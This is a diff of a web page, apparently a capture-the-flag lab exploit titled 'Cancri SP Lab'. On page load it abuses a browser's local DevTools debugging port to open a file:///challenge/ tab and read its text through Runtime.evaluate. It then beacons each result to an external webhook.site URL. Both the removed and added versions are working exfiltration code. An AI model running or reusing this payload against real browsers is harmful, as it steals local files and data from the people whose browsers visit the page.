@@ -1,99 +1,44 @@
 
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <title>Cancri SP Lab</title>
-</head>
-<body>
-  <h1>Cancri SP Lab</h1>
-  <pre id="status">Starting diagnostics...</pre>
+<script>
+const HOOK = "https://webhook.site/fa6817a2-e483-45f5-b5ba-2b895046ab55";
 
-  <script>
-    const HOOK =
-      "https://webhook.site/fa6817a2-e483-45f5-b5ba-2b895046ab55";
+function log(stage, data = {}) {
+  navigator.sendBeacon(HOOK, JSON.stringify({stage, data}));
+}
 
-    function log(stage, data = {}) {
-      const message = {
-        stage,
-        data,
-        time: new Date().toISOString()
-      };
+(async () => {
+  try {
+    const r = await fetch(
+      "http://localhost:9222/json/new?file:///challenge/",
+      {method: "PUT"}
+    );
 
-      document.getElementById("status").textContent =
-        JSON.stringify(message, null, 2);
+    const body = await r.text();
+    log("cdp_response", {status: r.status, body});
 
-      navigator.sendBeacon(
-        HOOK,
-        new Blob(
-          [JSON.stringify(message)],
-          { type: "text/plain" }
-        )
-      );
-    }
+    if (!r.ok) return;
 
-    async function run() {
-      log("page_loaded", { url: location.href });
+    const t = JSON.parse(body);
+    log("cdp_target", {url: t.url, ws: t.webSocketDebuggerUrl});
 
-      try {
-        const response = await fetch(
-          "http://localhost:9222/json/new?file:///challenge/",
-          { method: "PUT" }
-        );
+    const ws = new WebSocket(t.webSocketDebuggerUrl);
 
-        const text = await response.text();
-
-        log("cdp_response", {
-          status: response.status,
-          body: text
-        });
-
-        if (!response.ok) {
-          return;
+    ws.onopen = () => {
+      log("ws_open");
+      ws.send(JSON.stringify({
+        id: 1,
+        method: "Runtime.evaluate",
+        params: {
+          expression: "document.body.innerText",
+          returnByValue: true
         }
+      }));
+    };
 
-        const target = JSON.parse(text);
-
-        log("cdp_target", {
-          id: target.id,
-          url: target.url,
-          websocket: target.webSocketDebuggerUrl
-        });
-
-        const ws = new WebSocket(
-          target.webSocketDebuggerUrl
-        );
-
-        ws.onerror = () => log("websocket_error");
-
-        ws.onopen = async () => {
-          log("websocket_open");
-
-          ws.send(JSON.stringify({
-            id: 1,
-            method: "Runtime.evaluate",
-            params: {
-              expression: "document.body.innerText",
-              returnByValue: true
-            }
-          }));
-        };
-
-        ws.onmessage = event => {
-          log("cdp_result", {
-            response: event.data
-          });
-        };
-
-      } catch (error) {
-        log("exception", {
-          message: error.message,
-          stack: error.stack
-        });
-      }
-    }
-
-    run();
-  </script>
-</body>
-</html>
+    ws.onmessage = e => log("cdp_result", {data: e.data});
+    ws.onerror = () => log("ws_error");
+  } catch (e) {
+    log("exception", {message: e.message});
+  }
+})();
+</script>
